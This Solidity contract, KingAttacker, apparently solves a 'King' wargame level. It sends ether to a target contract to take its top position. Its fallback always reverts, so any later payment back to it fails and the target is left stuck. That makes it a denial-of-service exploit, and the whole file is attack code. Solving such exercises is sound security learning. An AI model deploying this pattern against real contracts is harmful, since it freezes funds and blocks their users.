// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract KingAttacker {
  constructor() {}

  function attack(address payable targetAddress) public payable {
    targetAddress.transfer(msg.value);
  }

  fallback() external {
    revert();
  }
}